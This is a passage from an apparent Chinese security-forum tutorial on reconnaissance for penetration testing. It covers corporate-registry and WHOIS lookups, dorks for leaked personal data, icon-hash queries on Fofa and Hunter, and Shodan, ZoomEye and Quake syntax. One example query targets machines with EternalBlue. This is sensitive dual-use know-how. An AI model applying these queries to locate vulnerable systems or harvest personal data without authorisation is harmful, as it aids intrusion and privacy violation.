<p><a href="https://forum.butian.net/share/2841#9095-1609291086831" target="_blank" rel="noopener noreferrer">3.2、通过搜索框查找相关文章辨别脚本类型</a></p>
<p><a href="https://forum.butian.net/share/2841#3279-1609291086831" target="_blank" rel="noopener noreferrer">3.3、通过爬虫工具爬取网站目录判断网站脚本类型</a></p>
<p><a href="https://forum.butian.net/share/2841#9730-1609291081999" target="_blank" rel="noopener noreferrer">4、CMS类型</a></p>
<p><a href="https://forum.butian.net/share/2841#8518-1608956783838" target="_blank" rel="noopener noreferrer">4.1、云悉指纹</a></p>
<p><a href="https://forum.butian.net/share/2841#8393-1608956783838" target="_blank" rel="noopener noreferrer">4.2、ThreatScan</a></p>
<p><a href="https://forum.butian.net/share/2841#2042-1608956783838" target="_blank" rel="noopener noreferrer">4.3、wappalyzer</a></p>
<p><a href="https://forum.butian.net/share/2841#2217-1608994323598" target="_blank" rel="noopener noreferrer">4.4、WhatWeb</a></p>
<p><a href="https://forum.butian.net/share/2841#1160-1608956783838" target="_blank" rel="noopener noreferrer">4.5、BugScaner</a></p>
<p><a href="https://forum.butian.net/share/2841#3663-1608994632867" target="_blank" rel="noopener noreferrer">4.6、潮汐指纹</a></p>
<p><a href="https://forum.butian.net/share/2841#6783-1608920351807" target="_blank" rel="noopener noreferrer">5、数据库类型</a></p>
<p><a href="https://forum.butian.net/share/2841#5381-1608920351807" target="_blank" rel="noopener noreferrer">6、WAF</a></p>
<p><a href="https://forum.butian.net/share/2841#9127-1609286607208" target="_blank" rel="noopener noreferrer">6.1、在线资产识别</a></p>
<p><a href="https://forum.butian.net/share/2841#9160-1609286607208" target="_blank" rel="noopener noreferrer">6.2、手动检测是拦截页面或者HTTP可识别字段</a></p>
<p><a href="https://forum.butian.net/share/2841#5054-1608956818746" target="_blank" rel="noopener noreferrer">九、后台查找</a></p>
<p>工商数据收集</p>
<p>- 简介</p>
<p>- 工商数据可以帮助测试人员更好地了解目标公司的信息，以便收敛测试的目标范围。</p>
<p>例如，可以通过工商数据获取公司的控股子公司、经营业务、对外发布的产品等信息</p>
<p>这些信息可以帮助我们更准确地识别出目标公司的网络资产，以便对其进行更有效漏洞挖掘</p>
<p>- 工商数据</p>
<p>- 信息来源</p>
<p>- 爱企查</p>
<p>- 企百笪</p>
<p>- 天眼查</p>
<p>- 启信宝</p>
<p>- 小蓝本</p>
<p>- 关注内容</p>
<p>- 企业股权架构</p>
<p>- 网站备案</p>
<p>- 对外公布的产品（小程序、公众号APP、iot设备等）</p>
<p>- 法人电话号、邮箱</p>
<p>- 用处</p>
<ol>
<li>获取控股子公司名称，收集边缘子公司资产</li>
<li>获取备案根域名</li>
<li>获取其他互联网资产</li>
<li>收集用户名等信息</li>
</ol>
<p>- 思路</p>
<p>- 拿到目标公司名之后，先不要着急直接开始收集子域名，先统计好这家公司的股权架构，一般50%控股的可以算作有效目标，子公司资产将为我们提供不少的边缘业务系统</p>
<p>- 通过股权穿透图收集完子公司名称后，网站备案、对外发布的产品、法人电话和邮箱同样也是比较重要的数据</p>
<p>- <em>工具推荐</em></p>
<p>- <a href="https://github.com/wgpsec/ENScan_GO" target="_blank" rel="noopener noreferrer">https://github.com/wgpsec/ENScan_GO</a></p>
<h3 id="站长之家" class="headerLink">
    <a href="#%e7%ab%99%e9%95%bf%e4%b9%8b%e5%ae%b6" class="header-mark"></a>站长之家</h3><p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener noreferrer">http://whois.chinaz.com/</a></p>
<p>利用查询到网站管理员手机号码、姓名、邮箱通过Whois反查查询出网站管理员所注册过的域名，可以对注册的其他域名进行漏洞挖掘。</p>
<p><strong>邮箱反查：<a href="http://whois.chinaz.com/reverse?ddlSearchMode=1" target="_blank" rel="noopener noreferrer">http://whois.chinaz.com/reverse?ddlSearchMode=1</a></strong></p>
<p><strong>注册人反查：<a href="http://whois.chinaz.com/reverse?ddlSearchMode=1" target="_blank" rel="noopener noreferrer">http://whois.chinaz.com/reverse?ddlSearchMode=1</a></strong></p>
<p><strong>电话反查：<a href="http://whois.chinaz.com/reverse?ddlSearchMode=1" target="_blank" rel="noopener noreferrer">http://whois.chinaz.com/reverse?ddlSearchMode=1</a></strong></p>
<h3 id="爱站" class="headerLink">
    <a href="#%e7%88%b1%e7%ab%99" class="header-mark"></a>爱站</h3><p><a href="https://whois.aizhan.com/" target="_blank" rel="noopener noreferrer">https://whois.aizhan.com/</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002aweJ94NDmHV.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002aweJ94NDmHV.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002aweJ94NDmHV.jpg">
        
    </a></p>
<h3 id="微步" class="headerLink">
    <a href="#%e5%be%ae%e6%ad%a5" class="header-mark"></a>微步</h3><p><a href="https://x.threatbook.cn/" target="_blank" rel="noopener noreferrer">https://x.threatbook.cn/</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000030Md044NHbVm.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000030Md044NHbVm.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000030Md044NHbVm.jpg">
        
    </a></p>
<h3 id="国外的whois" class="headerLink">
    <a href="#%e5%9b%bd%e5%a4%96%e7%9a%84whois" class="header-mark"></a>国外的who.is</h3><p><a href="https://who.is/" target="_blank" rel="noopener noreferrer">https://who.is/</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001ppvGr3kTc8D.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001ppvGr3kTc8D.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001ppvGr3kTc8D.jpg">
        
    </a></p>
<h3 id="阿里云域名信息查询" class="headerLink">
    <a href="#%e9%98%bf%e9%87%8c%e4%ba%91%e5%9f%9f%e5%90%8d%e4%bf%a1%e6%81%af%e6%9f%a5%e8%af%a2" class="header-mark"></a>阿里云域名信息查询</h3><p><a href="https://whois.aliyun.com/" target="_blank" rel="noopener noreferrer">https://whois.aliyun.com</a></p>
<h3 id="腾讯查询" class="headerLink">
    <a href="#%e8%85%be%e8%ae%af%e6%9f%a5%e8%af%a2" class="header-mark"></a>腾讯查询</h3><p><a href="https://whois.cloud.tencent.com/" target="_blank" rel="noopener noreferrer">https://whois.cloud.tencent.com/</a></p>
<h3 id="中国互联网信息中心" class="headerLink">
    <a href="#%e4%b8%ad%e5%9b%bd%e4%ba%92%e8%81%94%e7%bd%91%e4%bf%a1%e6%81%af%e4%b8%ad%e5%bf%83" class="header-mark"></a>中国互联网信息中心</h3><p><a href="http://ipwhois.cnnic.net.cn/" target="_blank" rel="noopener noreferrer">http://ipwhois.cnnic.net.cn/</a></p>
<h2 id="icpinternet-content-provider备案查询" class="headerLink">
    <a href="#icpinternet-content-provider%e5%a4%87%e6%a1%88%e6%9f%a5%e8%af%a2" class="header-mark"></a>ICP(Internet Content Provider)备案查询</h2><p>可以查询该单位备案的其它网站</p>
<h3 id="国家企业信用信息公示系统" class="headerLink">
    <a href="#%e5%9b%bd%e5%ae%b6%e4%bc%81%e4%b8%9a%e4%bf%a1%e7%94%a8%e4%bf%a1%e6%81%af%e5%85%ac%e7%a4%ba%e7%b3%bb%e7%bb%9f" class="header-mark"></a>国家企业信用信息公示系统</h3><p><a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener noreferrer">http://www.gsxt.gov.cn/index.html</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002uT0Ol4GmzPt.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002uT0Ol4GmzPt.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002uT0Ol4GmzPt.jpg">
        
    </a></p>
<h3 id="icp备案查询网" class="headerLink">
    <a href="#icp%e5%a4%87%e6%a1%88%e6%9f%a5%e8%af%a2%e7%bd%91" class="header-mark"></a>ICP备案查询网</h3><p><a href="https://www.beianx.cn/" target="_blank" rel="noopener noreferrer">https://www.beianx.cn/</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004JqOFX3ybzo0.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004JqOFX3ybzo0.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004JqOFX3ybzo0.jpg">
        
    </a></p>
<h3 id="icp备案查询---站长工具" class="headerLink">
    <a href="#icp%e5%a4%87%e6%a1%88%e6%9f%a5%e8%af%a2---%e7%ab%99%e9%95%bf%e5%b7%a5%e5%85%b7" class="header-mark"></a>ICP备案查询 - 站长工具</h3><p><a href="http://icp.chinaz.com/" target="_blank" rel="noopener noreferrer">http://icp.chinaz.com/</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001vbhVD1t1Tnq.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001vbhVD1t1Tnq.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001vbhVD1t1Tnq.jpg">
        
    </a></p>
<h3 id="天眼查" class="headerLink">
    <a href="#%e5%a4%a9%e7%9c%bc%e6%9f%a5" class="header-mark"></a>天眼查</h3><p><a href="https://www.tianyancha.com/" target="_blank" rel="noopener noreferrer">https://www.tianyancha.com/</a></p>
<p>根据前面获取的企业名称可以获取目标企业的微信公众号、微博、备案站点、APP、软件著作权等信息</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003usUfs3JW96q.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003usUfs3JW96q.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003usUfs3JW96q.jpg">
        
    </a></p>
<h3 id="企查查" class="headerLink">
    <a href="#%e4%bc%81%e6%9f%a5%e6%9f%a5" class="header-mark"></a>企查查</h3><p><a href="https://www.qcc.com/" target="_blank" rel="noopener noreferrer">https://www.qcc.com/</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000c3yAp0Nw3Pb.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000c3yAp0Nw3Pb.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000c3yAp0Nw3Pb.jpg">
        
    </a></p>
<h2 id="seosearch-engine-optimization查询" class="headerLink">
    <a href="#seosearch-engine-optimization%e6%9f%a5%e8%af%a2" class="header-mark"></a>SEO(Search Engine Optimization)查询</h2><h3 id="爱站-seo综合查询" class="headerLink">
    <a href="#%e7%88%b1%e7%ab%99-seo%e7%bb%bc%e5%90%88%e6%9f%a5%e8%af%a2" class="header-mark"></a>爱站-SEO综合查询</h3><p><a href="https://www.aizhan.com/cha/" target="_blank" rel="noopener noreferrer">https://www.aizhan.com/cha/</a></p>
<p>可以根据域名来收集目标站点的备案信息、名称、注册人等信息<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000022KyrV0NMUen.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000022KyrV0NMUen.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000022KyrV0NMUen.jpg">
        
    </a></p>
<h3 id="站长-seo综合查询" class="headerLink">
    <a href="#%e7%ab%99%e9%95%bf-seo%e7%bb%bc%e5%90%88%e6%9f%a5%e8%af%a2" class="header-mark"></a>站长-SEO综合查询</h3><p><a href="http://seo.chinaz.com/" target="_blank" rel="noopener noreferrer">http://seo.chinaz.com/</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004Nf5Qw33KAs3.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004Nf5Qw33KAs3.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004Nf5Qw33KAs3.jpg">
        
    </a></p>
<h3 id="googlebingbaidu" class="headerLink">
    <a href="#googlebingbaidu" class="header-mark"></a>Google、bing、baidu</h3><p><code>Google</code>需要翻墙，一般用来收集一些敏感信息，用老生常谈的方法</p>
<p>这样收集特定的域名</p>
<p>site:xxx.cn</p>
<p>我通常用来收集特定资产的敏感信息</p>
<p>如 <code>intext:``身份证</code> <code>intext:``电话</code> 再指定后缀 <code>xlsx</code> <code>pdf</code> <code>docs</code>等</p>
<p>另外的时候会收集一些藏的比较深的路由</p>
<p>指定<code>inurl:xxx</code>可能会发现额外的资产</p>
<p>不过相比起<code>Google</code>我更喜欢用<code>Bing</code>，因为不用翻墙</p>
<p>语法的话与<code>Google</code>同理，不过<code>Bing</code>如果用谷歌语法的话搜集的内容会模糊一些，不是精准搜索</p>
<p><a href="https://cn.bing.com/" target="_blank" rel="noopener noreferrer">https://cn.bing.com/</a></p>
<p>最后就是百度，也是搜集信息的一种方式</p>
<p>Ps:``搜索引擎一般用来收集信息泄露和隐藏较深的路由</p>
<p>这里给大家推荐一个网站 (本人也是看别人的知道的【信息收集之-你不知道的骚思路】<a href="https://www.bilibili.com/video/BV1yP4y117Q2?vd_source=6ce69e079d1dd642d7810fbf2e9c817e" target="_blank" rel="noopener noreferrer">https://www.bilibili.com/video/BV1yP4y117Q2?vd_source=6ce69e079d1dd642d7810fbf2e9c817e</a>)</p>
<p>二开谷歌语法&mdash;&mdash;<a href="https://searchtool.drtsrc.com/" target="_blank" rel="noopener noreferrer">https://searchtool.drtsrc.com/</a> (国内版)</p>
<p>-&mdash;&mdash;&mdash;&mdash;&mdash;-<a href="https://dorks.faisalahmed.me/" target="_blank" rel="noopener noreferrer">https://dorks.faisalahmed.me/</a> (国外版)</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004YeMUC3QPhY3.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004YeMUC3QPhY3.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004YeMUC3QPhY3.jpg">
        
    </a></p>
<h2 id="github" class="headerLink">
    <a href="#github" class="header-mark"></a>Github</h2><p>GitHub源码泄露肯定都听说过，但是真正找的源码的案例可能很少，可能是你用的方法有问题，网站域名、网站JS路径、网站备案、网站下的技术支持这些都可以放进去GitHub搜</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002bsw454I3KD6.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002bsw454I3KD6.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002bsw454I3KD6.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000Iinc44GQdbR.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000Iinc44GQdbR.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000Iinc44GQdbR.jpg">
        
    </a></p>
<p>精确搜索：被双引号引起来的部分代表精确匹配</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002H5Sm74SN1FL.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002H5Sm74SN1FL.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002H5Sm74SN1FL.jpg">
        
    </a></p>
<p><strong>Fofa 360</strong> <strong>鹰图 钟馗之眼</strong></p>
<p>鹰图提炼图标很好用</p>
<p>web.icon==&ldquo;4eeb8a8eb30b70af511dcc28c11a3216&rdquo;</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004OSAMR3zhXaL.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004OSAMR3zhXaL.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004OSAMR3zhXaL.jpg">
        
    </a></p>
<p>\=模糊</p>
<p>\==精准</p>
<p>Fofa</p>
<p>icon_hash=&ldquo;174665376&rdquo;</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003xRS4P24wOie.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003xRS4P24wOie.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003xRS4P24wOie.jpg">
        
    </a></p>
<p>其实，这时候可以发现很多图标，两者是相辅相成的，通过收集图标提炼共性标题，通过收集标题找到共性图标</p>
<p>最好多加个几个精准条件</p>
<p>web.icon==&ldquo;4eeb8a8eb30b70af511dcc28c11a3216&rdquo;&amp;&amp;title=&ldquo;ruoyi&rdquo;</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002DGjP71rfUFv.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002DGjP71rfUFv.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002DGjP71rfUFv.jpg">
        
    </a></p>
<p>`Web``的内容```</p>
<p>body=ruoyi</p>
<p>大家记得多看前端源码</p>
<h3 id="提炼特殊路由" class="headerLink">
    <a href="#%e6%8f%90%e7%82%bc%e7%89%b9%e6%ae%8a%e8%b7%af%e7%94%b1" class="header-mark"></a>提炼特殊路由</h3><p>不同的站点路由其实是不一样的，在这里的话若依站点最特殊的路由是<code>prod-api</code></p>
<p>因此我们从路由的角度来体验</p>
<p>一种是找超链接的提炼方式</p>
<p>body=prod-api/</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000439SUk2LQHaX.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000439SUk2LQHaX.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000439SUk2LQHaX.jpg">
        
    </a></p>
<p>可以找到站点中带有若依的超链接路由</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002suF1Y2jiQpf.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002suF1Y2jiQpf.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002suF1Y2jiQpf.jpg">
        
    </a></p>
<p>打开之后我们就可以发现确实超链接指向的是若依的系统</p>
<p>如果收集的若依系统够多，可以发现存在二开的系统有其他的路由，比如<code>admin-api</code> <code>dev-api</code> 等等</p>
<p>另一种方式可能就需要用到搜索引擎去相辅相成的寻找特殊路由</p>
<h3 id="git提炼" class="headerLink">
    <a href="#git%e6%8f%90%e7%82%bc" class="header-mark"></a>GIT提炼</h3><p>很多开源的若依二开可以在<code>github</code>找到相关的项目，往往修改较多的就是默认的<code>prod-api</code>为主，可以按照上面的内容去提炼，这样可以直接收集各个二开若依系统</p>
<h3 id="傻蛋" class="headerLink">
    <a href="#%e5%82%bb%e8%9b%8b" class="header-mark"></a>傻蛋</h3><p>网址：<a href="https://www.shodan.io/" target="_blank" rel="noopener noreferrer">https://www.shodan.io</a></p>
<p>活动：<strong>Shodan*</strong>*黑五1美元一个，淘宝、咸鱼可以看看**</p>
<p>普通：69美元 每月最多 100 万个结果 每月扫描多达 5,120 个 IP 5,120 个 IP 的网络监控</p>
<p>高级：359美元 每月最多 2000 万个结果 每月扫描多达 65,536 个 IP 65,536 个 IP 的网络监控</p>
<p>超级：1099元 每月无限 每月扫描多达 327,680 个 IP 327,680 个 IP 的网络监控</p>
<p>普通与高级功能差别：漏洞搜索过滤器</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004N5qYY1k9t6U.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004N5qYY1k9t6U.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004N5qYY1k9t6U.jpg">
        
    </a></p>
<h4 id="语法" class="headerLink">
    <a href="#%e8%af%ad%e6%b3%95" class="header-mark"></a>语法</h4><ul>
<li>city：搜索指定城市 例如：<strong>city:“tokyo ”</strong></li>
<li>country：搜索指定国家 例如：<strong>country:“JP”</strong></li>
<li>http.title：搜索指定网站标题 列如：<strong>http.title:“hacked by”</strong></li>
<li>http.html：搜索指定网页类容 例如：<strong>http.html:“hello world”</strong></li>
<li>http.status：搜索指定返回响应码 例如：<strong>http.status:“200”</strong></li>
<li>http.server：搜索指定返回中的server类型 例如：<strong>http.server:“PHP”</strong></li>
<li>net：搜索指定网络范围或 IP段，例如：<strong>net:“8.8.0.0/16”</strong></li>
<li>org：搜索指定的组织或机构，例如：<strong>org:“google”</strong></li>
<li>port：搜索指定的端口或服务，例如：<strong>port:“22”</strong></li>
<li>product：搜索指定的操作系统/软件/中间件，列如：<strong>product:“Samsung”</strong></li>
<li>screenshot.label：搜索指定描述图像内容的标签 列如：<strong>screenshot.label:“ics”</strong></li>
<li>os：搜索指定限定系统OS版本， 例如：<strong>os:“Windows Server 2008 R2”</strong></li>
<li>hostname：搜索指定的主机或域名，例如：<strong>hostname:“google”</strong></li>
<li>vuln：搜索指定CVE漏洞编号，例如：<strong>vuln:“CVE-2014-0723”</strong></li>
<li>isp：搜索指定的ISP供应商，例如：<strong>isp:“China Telecom”</strong></li>
<li>version：搜索指定的软件版本，例如：<strong>version:“1.2.3”</strong></li>
<li>geo：搜索指定的地理位置，参数为经纬度，例如：<strong>geo:“44.55,66.77”</strong></li>
</ul>
<h4 id="搜索案例" class="headerLink">
    <a href="#%e6%90%9c%e7%b4%a2%e6%a1%88%e4%be%8b" class="header-mark"></a>搜索案例</h4><p>搜索日本国家，中间件是Apache服务器并且状态码是200的机器</p>
<p>country:&ldquo;JP&rdquo; &amp;&amp; apache &amp;&amp; http.status:&ldquo;200&rdquo;</p>
<p>搜索日本国家，摄像头是海康威视</p>
<p>country:&ldquo;JP&rdquo; &amp;&amp; Hikvision-Webs</p>
<p>搜索日本国家，操作系统是Windows Server 2008 R2并且开放3389端口的机器</p>
<p>country:jp &amp;&amp; os:Windows Server 2008 R2 &amp;&amp; port:3389</p>
<p>搜索日本国家，操作系统是Windows Server并且存在永恒之蓝漏洞的机器(更高级会员才能使用vuln)</p>
<p>country:jp &amp;&amp; os:Windows Server * &amp;&amp; vuln:CVE-2017-0146</p>
<h4 id="shodanhttpssocsdnnetsosearchqshodanspm1001210130017020语法参考资料" class="headerLink">
    <a href="#shodanhttpssocsdnnetsosearchqshodanspm1001210130017020%e8%af%ad%e6%b3%95%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99" class="header-mark"></a><a href="https://so.csdn.net/so/search?q=shodan&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener noreferrer">shodan</a>语法参考资料</h4><p><a href="https://www.shodan.io/search/filters" target="_blank" rel="noopener noreferrer">Filter Reference</a> <a href="https://www.shodan.io/search/filters" target="_blank" rel="noopener noreferrer">https://www.shodan.io/search/filters</a></p>
<p><a href="https://www.cnblogs.com/H4ck3R-XiX/p/12950736.html" target="_blank" rel="noopener noreferrer">Shodan使用指南 - zha0gongz1 - 博客园</a><a href="https://www.cnblogs.com/H4ck3R-XiX/p/12950736.html" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/H4ck3R-XiX/p/12950736.html</a></p>
<p><a href="https://blog.csdn.net/weixin_41489908/article/details/110404340" target="_blank" rel="noopener noreferrer">暗黑引擎 &ndash; Shodan常用搜索语法_web安全工具库的博客-CSDN博客_shodan搜索语法</a><a href="https://blog.csdn.net/weixin_41489908/article/details/110404340" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/weixin_41489908/article/details/110404340</a></p>
<h3 id="钟馗之眼--知道创宇" class="headerLink">
    <a href="#%e9%92%9f%e9%a6%97%e4%b9%8b%e7%9c%bc--%e7%9f%a5%e9%81%93%e5%88%9b%e5%ae%87" class="header-mark"></a>钟馗之眼&ndash;知道创宇</h3><p><a href="https://www.zoomeye.org/" target="_blank" rel="noopener noreferrer">ZoomEye - Cyberspace Search Engine</a> <a href="https://www.zoomeye.org/" target="_blank" rel="noopener noreferrer">https://www.zoomeye.org/</a></p>
<p>免费： 查询结果展示量：4百条 查询API额度：每月1w</p>
<p>高级：4800/年 查询结果展示量：1千条 查询API额度：每月3w</p>
<p>VIP：9600/年 查询结果展示量：2千条 查询API额度：每月4w</p>
<p>高级与VIP功能差别：蜜罐识别</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003tn0a64TJL2G.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003tn0a64TJL2G.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003tn0a64TJL2G.jpg">
        
    </a></p>
<h4 id="语法-1" class="headerLink">
    <a href="#%e8%af%ad%e6%b3%95-1" class="header-mark"></a>语法</h4><ul>
<li>country：搜索指定国家 例如：<strong>country:“JP”</strong></li>
<li>city：搜索指定城市 例如：<strong>city:“San Diego”</strong></li>
<li><a href="https://www.zoomeye.org/searchResult?q=subdivisions:" target="_blank" rel="noopener noreferrer">subdivisions</a>：搜索相关指定行政区的资产 例如：<strong>subdivisions:“*</strong>*东京”**</li>
<li><a href="https://www.zoomeye.org/searchResult?q=ssl.cert.availability:1" target="_blank" rel="noopener noreferrer">ssl.cert.availability</a>：搜索证书是否在有效期内 例如：<strong>ssl:“1”or“0”</strong></li>
<li>ip：搜索指定的IP(ipv4/6) 列如：<a href="https://www.zoomeye.org/searchResult?q=ip:" target="_blank" rel="noopener noreferrer">ip:</a><strong>“8.8.8.8”</strong></li>
<li>cidr：搜索指定的IP段 列如：<a href="https://www.zoomeye.org/searchResult?q=cidr:52.2.254.36/24" target="_blank" rel="noopener noreferrer">cidr:</a><strong>“52.2.254.36/24”</strong></li>
<li>org：搜索指定的组织或机构，例如：<strong>org:“google”</strong></li>
<li>isp：搜索相关网络服务提供商的资产 例如：<a href="https://www.zoomeye.org/searchResult?q=isp:" target="_blank" rel="noopener noreferrer">isp:</a><strong>“China Mobile”</strong></li>
<li>port：搜索指定的端口或服务，例如：<strong>port:“22”</strong></li>
<li>hostname：搜索相关IP&quot;主机名&quot;的资产 例如：<a href="https://www.zoomeye.org/searchResult?q=hostname:google.com" target="_blank" rel="noopener noreferrer">hostname:</a><strong>“google.com”</strong></li>
<li>site：搜索域名相关的资产 例如：<a href="https://www.zoomeye.org/searchResult?q=site:baidu.com" target="_blank" rel="noopener noreferrer">site:</a><strong>“baidu.com”</strong></li>
<li>device：搜索路由器相关的设备类型 例如：<a href="https://www.zoomeye.org/searchResult?q=device:" target="_blank" rel="noopener noreferrer">device:</a><strong>“router”</strong></li>
<li>os：搜索指定限定系统OS版本， 例如：<strong>os:“Windows Server 2008 R2”</strong></li>
<li>title：搜索指定网页类容 例如：<a href="https://www.zoomeye.org/searchResult?q=title:" target="_blank" rel="noopener noreferrer">title:</a><strong>“hello world”</strong></li>
<li>app：搜索指定的组件 列如：<strong>app:“apache ”</strong></li>
<li>ver：搜索指定的版本 l例如：<strong>ver“1.2.3”</strong></li>
<li>service：指定服务类型 例如：<strong>service:“ftp”</strong></li>
</ul>
<h4 id="钟馗之眼语法参考资料" class="headerLink">
    <a href="#%e9%92%9f%e9%a6%97%e4%b9%8b%e7%9c%bc%e8%af%ad%e6%b3%95%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99" class="header-mark"></a>钟馗之眼语法参考资料</h4><p><a href="https://blog.csdn.net/qq_42716969/article/details/105994291" target="_blank" rel="noopener noreferrer">Zoomeye-钟馗之眼语法参考_Pika_mia的博客-CSDN博客_zoomeye语法</a></p>
<p><a href="https://blog.csdn.net/ncafei/article/details/63683377" target="_blank" rel="noopener noreferrer">zoomeye用户使用手册_ncafei的博客-CSDN博客_zoomeye</a></p>
<p><a href="https://www.cnblogs.com/someone9/p/8688636.html" target="_blank" rel="noopener noreferrer">ZoomEye（钟馗之眼）搜索技巧记录： - _H0f - 博客园</a></p>
<p><a href="https://www.freebuf.com/sectool/163782.html" target="_blank" rel="noopener noreferrer">信息收集利器：ZoomEye - FreeBuf网络安全行业门户</a></p>
<h3 id="360-quake--360" class="headerLink">
    <a href="#360-quake--360" class="header-mark"></a>360 QUAKE&ndash;360</h3><p><a href="https://quake.360.cn/quake/#/index" target="_blank" rel="noopener noreferrer">360网络空间测绘 — 因为看见，所以安全</a></p>
<p>免费 数据广度开放性：5百条 Quake积分：3千/月</p>
<p>高级：299/年 数据广度开放性：5千条 Quake积分 ：3W/月</p>
<p>终身：999 数据广度开放性：1W条 Quake积分 ：5W/月</p>
<p>功能差别：相似图标、深度识别、专用语法、圈内交流</p>
<p><strong>邀请码： Cm2TX9</strong></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002XFEeB0bhpLV.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002XFEeB0bhpLV.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002XFEeB0bhpLV.jpg">
        
    </a></p>
<h4 id="语法-2" class="headerLink">
    <a href="#%e8%af%ad%e6%b3%95-2" class="header-mark"></a>语法</h4><ul>
<li>country：搜索指定国家（中文添加_cn） 例如：<strong>country:“JP”</strong></li>
<li>city：搜索指定城市 例如：<strong>city:“tokyo ”</strong></li>
<li>owner：搜索IP归属单位 例如：<strong>owner:“tencent.com”</strong></li>
<li>isp：搜索IP归属运营商 例如：<strong>isp:“amazon.com”</strong></li>
<li>ip：查询IP地址或网段 列如：<strong>ip:&ldquo;1.1.1.1/22&rdquo;</strong></li>
<li>is_ipv6：查询IPV6格式的IP 列如：<strong>sis_ipv6:&ldquo;true&rdquo;</strong></li>
<li>port：搜索指定的端口或服务 例如：<strong>port:“[50 TO 60]”</strong></li>
<li>transport：查询udp数据 例如：<strong>transport:“udp”</strong></li>
<li>domain：查询资产域名 例如：<strong>domain:“google.com”</strong></li>
<li>hostname：查询主机名包含指定资产的数据 例如： <strong>hostname:“google.com”</strong></li>
